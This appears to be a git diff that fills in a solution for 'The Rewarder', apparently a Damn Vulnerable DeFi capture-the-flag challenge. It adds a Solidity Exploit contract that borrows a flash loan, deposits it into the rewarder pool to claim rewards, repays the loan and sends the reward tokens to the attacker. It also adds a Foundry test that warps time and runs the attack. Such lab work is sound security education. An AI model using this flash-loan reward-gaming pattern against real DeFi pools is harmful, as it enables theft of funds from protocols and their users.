@@ -10,6 +10,86 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+interface IFlashLoanerPool {
+    function flashLoan(uint256 amount) external;
+}
+
+interface ITheRewarderPool {
+    function deposit(uint256 amountToDeposit) external;
+
+    function withdraw(uint256 amountToWithdraw) external;
+
+    function distributeRewards() external returns (uint256);
+}
+
+interface IERC20 {
+    function transfer(address to, uint256 amount) external;
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract Exploit {
+    event WithdrawSuccessful();
+    event DepositSuccessful();
+
+    address internal immutable owner;
+    address internal immutable lenderPoolAddress;
+    address internal immutable rewarderPoolAddress;
+    address internal immutable dvtAddress;
+    address internal immutable rewardTokenAddress;
+
+    constructor(
+        address owner_,
+        address lenderPoolAddress_,
+        address rewarderPoolAddress_,
+        address dvtAddress_,
+        address rewardTokenAddress_
+    ) {
+        owner = owner_;
+        lenderPoolAddress = lenderPoolAddress_;
+        rewarderPoolAddress = rewarderPoolAddress_;
+        dvtAddress = dvtAddress_;
+        rewardTokenAddress = rewardTokenAddress_;
+    }
+
+    modifier isLenderPool() {
+        require(msg.sender == lenderPoolAddress, "Must be lender pool");
+        _;
+    }
+
+    function receiveFlashLoan(uint256 amount) external isLenderPool {
+        // Use flash loan to deposit into the rewarder pool
+        IERC20(dvtAddress).approve(rewarderPoolAddress, amount);
+        ITheRewarderPool(rewarderPoolAddress).deposit(amount);
+        emit DepositSuccessful();
+
+        // ~~ maybe do some magic ~~
+
+        // Withdraw balance and pay back flash loan
+        ITheRewarderPool(rewarderPoolAddress).withdraw(amount);
+        emit WithdrawSuccessful();
+        IERC20(address(dvtAddress)).transfer(lenderPoolAddress, amount);
+    }
+
+    modifier isOwner() {
+        require(msg.sender == owner, "Must be owner");
+        _;
+    }
+
+    function exploit(uint256 amount_) public isOwner {
+        // 1. Create a flashloan, which will also invoke our `receiveFlashLoan(amount)` function
+        IFlashLoanerPool(lenderPoolAddress).flashLoan(amount_);
+
+        // 2. Send reward token back to attacker
+        uint256 rewardTokenBalance = IERC20(rewardTokenAddress).balanceOf(
+            address(this)
+        );
+        IERC20(rewardTokenAddress).transfer(owner, rewardTokenBalance);
+    }
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -89,8 +169,22 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+        vm.warp(block.timestamp + 5 days); // 5 days
+
+        Exploit exploitContract = new Exploit(
+            attacker,
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(dvt),
+            address(theRewarderPool.rewardToken())
+        );
+        vm.label(address(exploitContract), "Exploit Contract");
+        exploitContract.exploit(TOKENS_IN_LENDER_POOL);
+        vm.stopPrank();
         /** EXPLOIT END **/
+
         validation();
     }
 
